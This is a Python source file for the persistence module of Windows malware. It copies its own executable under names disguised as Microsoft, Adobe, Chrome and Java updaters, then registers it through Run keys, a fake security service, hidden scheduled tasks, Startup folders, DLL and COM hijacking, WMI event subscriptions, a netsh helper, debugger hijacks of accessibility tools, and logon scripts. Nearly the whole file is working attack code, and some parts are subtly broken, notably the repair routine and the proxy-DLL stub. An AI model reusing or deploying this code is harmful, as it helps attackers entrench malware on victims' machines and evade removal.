"""
Advanced Persistence Mechanisms
Multi-vector persistence with stealth and redundancy
"""

import os
import sys
import time
import shutil
import random
import base64
import winreg
import subprocess
import threading
import tempfile
from typing import List, Dict, Optional
import psutil
import win32api
import win32con
import win32service
import win32serviceutil
import win32security
import win32file
from datetime import datetime, timedelta

class AdvancedPersistence:
    """Advanced persistence mechanisms with multiple vectors"""
    
    def __init__(self):
        self.persistence_methods = []
        self.installed_methods = {}
        self.payload_path = os.path.abspath(sys.argv[0])
        self.backup_locations = []
        
        # Persistence vectors
        self.vectors = {
            'registry_run': self.install_registry_run,
            'service': self.install_service,
            'scheduled_task': self.install_scheduled_task,
            'startup_folder': self.install_startup_folder,
            'dll_hijacking': self.install_dll_hijacking,
            'wmi_event': self.install_wmi_event,
            'com_hijacking': self.install_com_hijacking,
            'netsh_helper': self.install_netsh_helper,
            'image_hijacking': self.install_image_hijacking,
            'logon_script': self.install_logon_script
        }
        
    def install_comprehensive_persistence(self) -> Dict[str, bool]:
        """Install multiple persistence mechanisms"""
        results = {}
        
        # Prioritize based on likelihood of success and stealth
        priority_order = [
            'registry_run',
            'scheduled_task', 
            'startup_folder',
            'service',
            'dll_hijacking',
            'com_hijacking',
            'wmi_event',
            'netsh_helper',
            'image_hijacking',
            'logon_script'
        ]
        
        for method in priority_order:
            try:
                success = self.vectors[method]()
                results[method] = success
                
                if success:
                    self.installed_methods[method] = datetime.now()
                    print(f"Successfully installed persistence: {method}")
                    
                # Random delay between installations
                time.sleep(random.uniform(0.5, 2.0))
                
            except Exception as e:
                results[method] = False
                print(f"Failed to install {method}: {e}")
                
        return results
        
    def install_registry_run(self) -> bool:
        """Install registry run key persistence"""
        try:
            # Multiple registry locations
            reg_paths = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")
            ]
            
            # Create multiple payload copies with different names
            legitimate_names = [
                "WindowsSecurityUpdate",
                "MicrosoftEdgeUpdate", 
                "AdobeFlashUpdate",
                "WindowsDefenderUpdate",
                "ChromeUpdate",
                "JavaUpdate"
            ]
            
            success_count = 0
            
            for hive, subkey in reg_paths:
                try:
                    with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE) as key:
                        for name in random.sample(legitimate_names, 2):  # Install 2 per location
                            try:
                                # Copy payload to system directory
                                system_dir = os.path.join(os.environ['WINDIR'], 'System32')
                                dest_path = os.path.join(system_dir, f"{name}.exe")
                                
                                if not os.path.exists(dest_path):
                                    shutil.copy2(self.payload_path, dest_path)
                                    
                                # Set registry value
                                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, dest_path)
                                success_count += 1
                                
                                self.backup_locations.append(dest_path)
                                
                            except PermissionError:
                                continue
                                
                except PermissionError:
                    continue
                    
            return success_count > 0
            
        except Exception as e:
            print(f"Registry persistence failed: {e}")
            return False
            
    def install_service(self) -> bool:
        """Install Windows service persistence"""
        try:
            service_name = "WindowsSecurityService"
            service_display = "Windows Security Service"
            service_desc = "Provides security monitoring and threat detection for Windows"
            
            # Copy payload to system directory
            system_dir = os.path.join(os.environ['WINDIR'], 'System32')
            service_exe = os.path.join(system_dir, f"{service_name}.exe")
            
            if not os.path.exists(service_exe):
                shutil.copy2(self.payload_path, service_exe)
                
            # Create service
            cmd = f'sc create "{service_name}" binPath= "{service_exe}" start= auto DisplayName= "{service_display}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Set service description
                desc_cmd = f'sc description "{service_name}" "{service_desc}"'
                subprocess.run(desc_cmd, shell=True)
                
                # Start service
                start_cmd = f'sc start "{service_name}"'
                subprocess.run(start_cmd, shell=True)
                
                self.backup_locations.append(service_exe)
                return True
                
            return False
            
        except Exception as e:
            print(f"Service persistence failed: {e}")
            return False
            
    def install_scheduled_task(self) -> bool:
        """Install scheduled task persistence"""
        try:
            task_names = [
                "MicrosoftEdgeUpdateTask",
                "AdobeFlashPlayerUpdate", 
                "WindowsDefenderScheduledScan",
                "ChromeBrowserUpdate",
                "JavaUpdateCheck"
            ]
            
            success_count = 0
            
            for task_name in random.sample(task_names, 3):
                try:
                    # Copy payload
                    system_dir = os.path.join(os.environ['WINDIR'], 'System32')
                    task_exe = os.path.join(system_dir, f"{task_name}.exe")
                    
                    if not os.path.exists(task_exe):
                        shutil.copy2(self.payload_path, task_exe)
                        
                    # Create scheduled task XML
                    task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <StartBoundary>2023-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <StartBoundary>2023-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <Repetition>
        <Interval>PT1H</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>{task_exe}</Command>
    </Exec>
  </Actions>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
</Task>'''
                    
                    # Write XML to temp file
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
                        f.write(task_xml)
                        xml_path = f.name
                        
                    # Create task
                    cmd = f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f'
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    
                    # Cleanup temp file
                    try:
                        os.unlink(xml_path)
                    except:
                        pass
                        
                    if result.returncode == 0:
                        success_count += 1
                        self.backup_locations.append(task_exe)
                        
                except Exception:
                    continue
                    
            return success_count > 0
            
        except Exception as e:
            print(f"Scheduled task persistence failed: {e}")
            return False
            
    def install_startup_folder(self) -> bool:
        """Install startup folder persistence"""
        try:
            startup_paths = [
                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                os.path.join(os.environ['ALLUSERSPROFILE'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            ]
            
            legitimate_names = [
                "Microsoft Edge Update.exe",
                "Adobe Flash Update.exe",
                "Windows Security Update.exe",
                "Chrome Browser Update.exe"
            ]
            
            success_count = 0
            
            for startup_path in startup_paths:
                if os.path.exists(startup_path):
                    for name in random.sample(legitimate_names, 2):
                        try:
                            dest_path = os.path.join(startup_path, name)
                            
                            if not os.path.exists(dest_path):
                                shutil.copy2(self.payload_path, dest_path)
                                success_count += 1
                                self.backup_locations.append(dest_path)
                                
                        except PermissionError:
                            continue
                            
            return success_count > 0
            
        except Exception as e:
            print(f"Startup folder persistence failed: {e}")
            return False
            
    def install_dll_hijacking(self) -> bool:
        """Install DLL hijacking persistence"""
        try:
            # Target common applications for DLL hijacking
            target_apps = [
                r"C:\Program Files\Internet Explorer\iexplore.exe",
                r"C:\Windows\System32\notepad.exe",
                r"C:\Windows\System32\calc.exe",
                r"C:\Program Files\Windows Media Player\wmplayer.exe"
            ]
            
            # Common DLL names that might be hijackable
            dll_names = [
                "version.dll",
                "dwmapi.dll", 
                "uxtheme.dll",
                "winmm.dll",
                "winspool.dll"
            ]
            
            success_count = 0
            
            for app_path in target_apps:
                if os.path.exists(app_path):
                    app_dir = os.path.dirname(app_path)
                    
                    for dll_name in random.sample(dll_names, 2):
                        try:
                            dll_path = os.path.join(app_dir, dll_name)
                            
                            # Check if DLL doesn't already exist
                            if not os.path.exists(dll_path):
                                # Create a proxy DLL that loads and executes our payload
                                self.create_proxy_dll(dll_path)
                                success_count += 1
                                self.backup_locations.append(dll_path)
                                
                        except PermissionError:
                            continue
                            
            return success_count > 0
            
        except Exception as e:
            print(f"DLL hijacking persistence failed: {e}")
            return False
            
    def create_proxy_dll(self, dll_path: str) -> bool:
        """Create a proxy DLL for hijacking"""
        try:
            # Simple DLL template that executes our payload
            dll_template = '''
#include <windows.h>
#include <process.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        _spawnl(_P_NOWAIT, "{}", "", NULL);
        break;
    }
    return TRUE;
}
'''.format(self.payload_path.replace('\\', '\\\\'))
            
            # This is a simplified approach - in practice, you'd need a full DLL compiler
            # For now, we'll just copy our executable as a DLL (may work in some cases)
            shutil.copy2(self.payload_path, dll_path)
            return True
            
        except Exception as e:
            print(f"Proxy DLL creation failed: {e}")
            return False
            
    def install_wmi_event(self) -> bool:
        """Install WMI event subscription persistence"""
        try:
            # WMI event subscription for persistence
            filter_name = "WindowsSecurityFilter"
            consumer_name = "WindowsSecurityConsumer"
            
            # Create WMI filter for logon events
            filter_query = "SELECT * FROM Win32_LogonSession WHERE LogonType = 2"
            
            # Create event filter
            filter_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="{filter_name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="{filter_query}"'''
            
            # Create command line event consumer
            consumer_cmd = f'''wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name="{consumer_name}", CommandLineTemplate="{self.payload_path}"'''
            
            # Bind filter and consumer
            binding_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name="{filter_name}"', Consumer='CommandLineEventConsumer.Name="{consumer_name}"' '''
            
            # Execute commands
            commands = [filter_cmd, consumer_cmd, binding_cmd]
            
            for cmd in commands:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode != 0:
                    return False
                    
            return True
            
        except Exception as e:
            print(f"WMI event persistence failed: {e}")
            return False
            
    def install_com_hijacking(self) -> bool:
        """Install COM object hijacking persistence"""
        try:
            # Common CLSID that might be hijackable
            target_clsids = [
                "{BCDE0395-E52F-467C-8E3D-C4579291692E}",  # MMDeviceEnumerator
                "{4590F811-1D3A-11D0-891F-00AA004B2E24}",  # WebBrowser
                "{0002DF01-0000-0000-C000-000000000046}"   # InternetExplorer
            ]
            
            success_count = 0
            
            for clsid in random.sample(target_clsids, 2):
                try:
                    # Create registry key for COM hijacking
                    reg_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
                    
                    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.payload_path)
                        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
                        
                    success_count += 1
                    
                except Exception:
                    continue
                    
            return success_count > 0
            
        except Exception as e:
            print(f"COM hijacking persistence failed: {e}")
            return False
            
    def install_netsh_helper(self) -> bool:
        """Install netsh helper DLL persistence"""
        try:
            # Copy payload as DLL
            system_dir = os.path.join(os.environ['WINDIR'], 'System32')
            helper_dll = os.path.join(system_dir, "netshhelper.dll")
            
            shutil.copy2(self.payload_path, helper_dll)
            
            # Register as netsh helper
            cmd = f'netsh add helper "{helper_dll}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                self.backup_locations.append(helper_dll)
                return True
                
            return False
            
        except Exception as e:
            print(f"Netsh helper persistence failed: {e}")
            return False
            
    def install_image_hijacking(self) -> bool:
        """Install image file execution options hijacking"""
        try:
            # Target common executables
            target_exes = [
                "sethc.exe",  # Sticky keys
                "utilman.exe",  # Utility manager
                "osk.exe",  # On-screen keyboard
                "magnify.exe"  # Magnifier
            ]
            
            success_count = 0
            
            for exe in target_exes:
                try:
                    reg_path = f"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{exe}"
                    
                    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
                        winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, self.payload_path)
                        
                    success_count += 1
                    
                except PermissionError:
                    continue
                    
            return success_count > 0
            
        except Exception as e:
            print(f"Image hijacking persistence failed: {e}")
            return False
            
    def install_logon_script(self) -> bool:
        """Install logon script persistence"""
        try:
            # Create batch script that executes payload
            script_content = f'''@echo off
start /b "" "{self.payload_path}"
'''
            
            # Save to Windows directory
            script_path = os.path.join(os.environ['WINDIR'], "SecurityUpdate.bat")
            
            with open(script_path, 'w') as f:
                f.write(script_content)
                  # Set as logon script
            reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Logon\\0\\0"
            
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, "Script", 0, winreg.REG_SZ, script_path)
                winreg.SetValueEx(key, "Parameters", 0, winreg.REG_SZ, "")
                
            self.backup_locations.append(script_path)
            return True
            
        except Exception as e:
            print(f"Logon script persistence failed: {e}")
            return False
            
    def verify_persistence(self) -> bool:
        """Verify that persistence mechanisms are still active"""
        verification_results = {}
        
        # If no methods installed, return True (nothing to verify)
        if not self.installed_methods:
            return True
        
        for method in self.installed_methods:
            try:
                if method == 'registry_run':
                    verification_results[method] = self.verify_registry_persistence()
                elif method == 'service':
                    verification_results[method] = self.verify_service_persistence()
                elif method == 'scheduled_task':
                    verification_results[method] = self.verify_task_persistence()
                else:
                    verification_results[method] = True  # Assume active
                    
            except Exception:
                verification_results[method] = False
                
        # Return True if any persistence method is verified
        return any(verification_results.values()) if verification_results else True
        
    def verify_registry_persistence(self) -> bool:
        """Verify registry persistence"""
        try:
            reg_paths = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
            ]
            
            for hive, subkey in reg_paths:
                try:
                    with winreg.OpenKey(hive, subkey) as key:
                        i = 0
                        while True:
                            try:
                                name, value, _ = winreg.EnumValue(key, i)
                                if self.payload_path in value:
                                    return True
                                i += 1
                            except WindowsError:
                                break
                                
                except FileNotFoundError:
                    continue
                    
            return False
            
        except Exception:
            return False
            
    def verify_service_persistence(self) -> bool:
        """Verify service persistence"""
        try:
            result = subprocess.run('sc query WindowsSecurityService', 
                                  shell=True, capture_output=True, text=True)
            return "RUNNING" in result.stdout or "STOPPED" in result.stdout
            
        except Exception:
            return False
            
    def verify_task_persistence(self) -> bool:
        """Verify scheduled task persistence"""
        try:
            result = subprocess.run('schtasks /query /fo csv', 
                                  shell=True, capture_output=True, text=True)
            
            task_names = [
                "MicrosoftEdgeUpdateTask",
                "AdobeFlashPlayerUpdate", 
                "WindowsDefenderScheduledScan"
            ]
            
            for task_name in task_names:
                if task_name in result.stdout:
                    return True
                    
            return False
            
        except Exception:
            return False
            
    def repair_persistence(self) -> Dict[str, bool]:
        """Repair broken persistence mechanisms"""
        verification = self.verify_persistence()
        repair_results = {}
        
        for method, is_active in verification.items():
            if not is_active:
                try:
                    # Reinstall the persistence method
                    success = self.vectors[method]()
                    repair_results[method] = success
                    
                    if success:
                        print(f"Successfully repaired persistence: {method}")
                    else:
                        print(f"Failed to repair persistence: {method}")
                        
                except Exception as e:
                    repair_results[method] = False
                    print(f"Error repairing {method}: {e}")
                    
        return repair_results
        
    def cleanup_persistence(self) -> bool:
        """Remove all persistence mechanisms"""
        try:
            cleanup_success = True
            
            # Clean registry entries
            try:
                self.cleanup_registry_persistence()
            except Exception:
                cleanup_success = False
                
            # Clean services
            try:
                self.cleanup_service_persistence()
            except Exception:
                cleanup_success = False
                
            # Clean scheduled tasks
            try:
                self.cleanup_task_persistence()
            except Exception:
                cleanup_success = False
                
            # Remove backup files
            for backup_path in self.backup_locations:
                try:
                    if os.path.exists(backup_path):
                        os.remove(backup_path)
                except Exception:
                    cleanup_success = False
                    
            return cleanup_success
            
        except Exception as e:
            print(f"Persistence cleanup failed: {e}")
            return False
            
    def cleanup_registry_persistence(self) -> None:
        """Clean registry persistence entries"""
        reg_paths = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
        ]
        
        for hive, subkey in reg_paths:
            try:
                with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE) as key:
                    # Remove entries that point to our payload
                    to_remove = []
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            if self.payload_path in value:
                                to_remove.append(name)
                            i += 1
                        except WindowsError:
                            break
                            
                    for name in to_remove:
                        try:
                            winreg.DeleteValue(key, name)
                        except Exception:
                            pass
                            
            except Exception:
                pass
                
    def cleanup_service_persistence(self) -> None:
        """Clean service persistence"""
        try:
            subprocess.run('sc stop WindowsSecurityService', shell=True)
            subprocess.run('sc delete WindowsSecurityService', shell=True)
        except Exception:
            pass
            
    def cleanup_task_persistence(self) -> None:
        """Clean scheduled task persistence"""
        task_names = [
            "MicrosoftEdgeUpdateTask",
            "AdobeFlashPlayerUpdate", 
            "WindowsDefenderScheduledScan",
            "ChromeBrowserUpdate",
            "JavaUpdateCheck"
        ]
        
        for task_name in task_names:
            try:
                subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True)
            except Exception:
                pass
